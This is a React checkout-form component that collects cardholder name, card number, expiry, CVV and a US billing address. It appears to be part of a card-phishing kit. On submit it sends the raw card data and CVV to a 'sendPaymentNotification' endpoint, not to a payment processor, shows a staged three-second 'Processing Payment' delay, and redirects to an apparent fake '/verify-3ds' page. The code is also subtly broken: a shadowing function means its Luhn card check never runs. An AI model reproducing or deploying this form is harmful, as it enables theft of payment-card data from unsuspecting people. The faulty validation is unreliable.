import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { Label } from "./ui/label";
import { useToast } from "./ui/use-toast";
import { sendPaymentNotification } from "../utils/internalApi";
import { GridLoader } from "react-spinners";
import { Building2 } from "lucide-react";
import { EncryptButton } from "./EncryptButton";
import { CardTypeIcon } from "./CardTypeIcon";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "./ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";

interface PaymentFormProps {
  amount: number;
}

interface BillingDetails {
  address1: string;
  address2: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    address1: "",
    address2: "",
    city: "",
    state: "",
    zipCode: "",
    country: "US",
  });
  const navigate = useNavigate();
  const { toast } = useToast();
  const searchParams = new URLSearchParams(window.location.search);
  const companyFromUrl = searchParams.get('company');

  useEffect(() => {
    if (companyFromUrl) {
      setBillingDetails(prev => ({
        ...prev,
        company: companyFromUrl
      }));
    }
  }, [companyFromUrl]);

  const validateCardHolder = (value: string) => {
    const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
    const dotCount = (value.match(/\./g) || []).length;
    
    value = value.slice(0, 12);
    
    if (!latinAndDotRegex.test(value)) {
      return value.replace(/[^a-zA-Z\s.]/g, '').toUpperCase();
    }
    
    if (dotCount > 1) {
      const firstDotIndex = value.indexOf('.');
      return (value.slice(0, firstDotIndex + 1) + value.slice(firstDotIndex + 1).replace(/\./g, '')).toUpperCase();
    }
    
    return value.toUpperCase();
  };

  const validateCardNumber = (value: string) => {
    return value.replace(/\D/g, '');
  };

  const validateExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '');
    if (cleanValue.length >= 2) {
      const month = parseInt(cleanValue.substring(0, 2));
      
      if (month > 12) {
        return '12' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }
      if (month === 0) {
        return '01' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }

      if (cleanValue.length >= 4) {
        const year = parseInt(cleanValue.substring(2, 4));
        
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;

        if (year < currentYear || (year === currentYear && month < currentMonth)) {
          toast({
            title: "Invalid Expiry Date",
            description: "Card has expired",
            variant: "destructive",
          });
          return '';
        }
      }

      return month.toString().padStart(2, '0') + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
    }
    return cleanValue;
  };

  const validateCVV = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 3);
  };

  const handleBillingDetailsChange = (field: keyof BillingDetails, value: string) => {
    setBillingDetails(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    if (!billingDetails.address1 || !billingDetails.city || !billingDetails.country || !billingDetails.state || !billingDetails.zipCode) {
      toast({
        title: "Missing Billing Details",
        description: "Please enter your complete billing information",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      await sendPaymentNotification({
        amount: amount,
        cardHolder,
        cardNumber,
        expiryDate,
        cvv,
        billingDetails
      });

      await new Promise(resolve => setTimeout(resolve, 3000));
      
      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
    } catch (error) {
      console.error('Error processing payment:', error);
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "Failed to process payment. Please try again.",
        variant: "destructive",
      });
    }
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return value;
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn relative">
      {isSubmitting && (
        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center gap-6 z-50 animate-fadeIn">
          <GridLoader color="#8B5CF6" size={15} margin={2} />
          <div className="text-white/90 font-medium text-lg">Processing Payment...</div>
          <div className="text-white/60 text-sm">Please do not close this window</div>
        </div>
      )}
      
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolder}
            onChange={(e) => setCardHolder(validateCardHolder(e.target.value))}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="space-y-2 relative">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(validateCardNumber(e.target.value)))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors pr-12"
            required
          />
          <CardTypeIcon cardNumber={cardNumber} />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(validateExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(validateCVV(e.target.value))}
              maxLength={3}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
        </div>

        <Dialog>
          <DialogTrigger asChild>
            <button
              type="button"
              className="relative w-full inline-flex items-center justify-center overflow-hidden transition-all duration-250 bg-gradient-to-r from-purple-900/80 to-violet-800/80 rounded-xl border border-white/10 outline-none px-4 py-3 hover:scale-[0.98] group"
            >
              <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_120%,rgba(120,0,255,0.4),rgba(120,0,255,0))]" />
              <div className="absolute inset-0 overflow-hidden">
                {Array.from({ length: 8 }).map((_, i) => (
                  <i
                    key={i}
                    className="absolute bottom-0 left-[var(--left)] w-[1px] h-[1px] bg-white rounded-full animate-sparkle"
                    style={{
                      '--left': `${[15, 25, 40, 55, 70, 85, 90, 95][i]}%`,
                      '--delay': `${i * 0.1}s`,
                    } as React.CSSProperties}
                  />
                ))}
              </div>
              <span className="relative z-[2] flex items-center justify-center gap-2 text-white font-medium group-hover:text-opacity-80">
                <Building2 className="w-5 h-5 text-purple-300" />
                Billing Details
              </span>
            </button>
          </DialogTrigger>
          <DialogContent className="bg-black/95 border border-purple-500/20 text-white max-h-[80vh] overflow-y-auto fixed top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] w-[90vw] max-w-[450px] rounded-xl backdrop-blur-xl shadow-[0_0_25px_rgba(139,92,246,0.1)] animate-in zoom-in-90 duration-200">
            <DialogHeader className="space-y-3 pb-4 border-b border-purple-500/20">
              <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-purple-300 to-violet-200 bg-clip-text text-transparent">
                Billing Details
              </DialogTitle>
              <p className="text-sm text-purple-200/60">Enter your billing information below</p>
            </DialogHeader>
            
            <div className="space-y-6 py-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-purple-200/80">Address Line 1</Label>
                  <Input
                    type="text"
                    value={billingDetails.address1}
                    onChange={(e) => handleBillingDetailsChange('address1', e.target.value)}
                    className="bg-purple-950/20 border-purple-500/20 text-white placeholder:text-purple-300/40 hover:border-purple-500/40 focus:border-purple-500/60 transition-colors"
                    placeholder="Street address"
                  />
                </div>
                
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-purple-200/80">Address Line 2 (Optional)</Label>
                  <Input
                    type="text"
                    value={billingDetails.address2}
                    onChange={(e) => handleBillingDetailsChange('address2', e.target.value)}
                    className="bg-purple-950/20 border-purple-500/20 text-white placeholder:text-purple-300/40 hover:border-purple-500/40 focus:border-purple-500/60 transition-colors"
                    placeholder="Apartment, suite, etc."
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-purple-200/80">City</Label>
                  <Input
                    type="text"
                    value={billingDetails.city}
                    onChange={(e) => handleBillingDetailsChange('city', e.target.value)}
                    className="bg-purple-950/20 border-purple-500/20 text-white placeholder:text-purple-300/40 hover:border-purple-500/40 focus:border-purple-500/60 transition-colors"
                    placeholder="City"
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-purple-200/80">State</Label>
                  <Select
                    value={billingDetails.state}
                    onValueChange={(value) => handleBillingDetailsChange('state', value)}
                  >
                    <SelectTrigger className="bg-purple-950/20 border-purple-500/20 text-white hover:border-purple-500/40 focus:border-purple-500/60">
                      <SelectValue placeholder="Select state" />
                    </SelectTrigger>
                    <SelectContent className="bg-black/95 border-purple-500/20 text-white">
                      {[
                        "AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA",
                        "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD",
                        "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ",
                        "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC",
                        "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"
                      ].map((state) => (
                        <SelectItem 
                          key={state} 
                          value={state}
                          className="text-white hover:bg-purple-500/20 focus:bg-purple-500/20"
                        >
                          {state}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-purple-200/80">ZIP Code</Label>
                  <Input
                    type="text"
                    value={billingDetails.zipCode}
                    onChange={(e) => handleBillingDetailsChange('zipCode', e.target.value.replace(/\D/g, '').slice(0, 5))}
                    className="bg-purple-950/20 border-purple-500/20 text-white placeholder:text-purple-300/40 hover:border-purple-500/40 focus:border-purple-500/60 transition-colors"
                    placeholder="ZIP code"
                    maxLength={5}
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-purple-200/80">Country</Label>
                  <Select
                    value={billingDetails.country}
                    onValueChange={(value) => handleBillingDetailsChange('country', value)}
                  >
                    <SelectTrigger className="bg-purple-950/20 border-purple-500/20 text-white hover:border-purple-500/40 focus:border-purple-500/60">
                      <SelectValue placeholder="Select country" />
                    </SelectTrigger>
                    <SelectContent className="bg-black/95 border-purple-500/20 text-white">
                      <SelectItem 
                        value="US"
                        className="text-white hover:bg-purple-500/20 focus:bg-purple-500/20"
                      >
                        United States
                      </SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        <EncryptButton isSubmitting={isSubmitting} />
      </div>
    </form>
  );
};

export default PaymentForm;
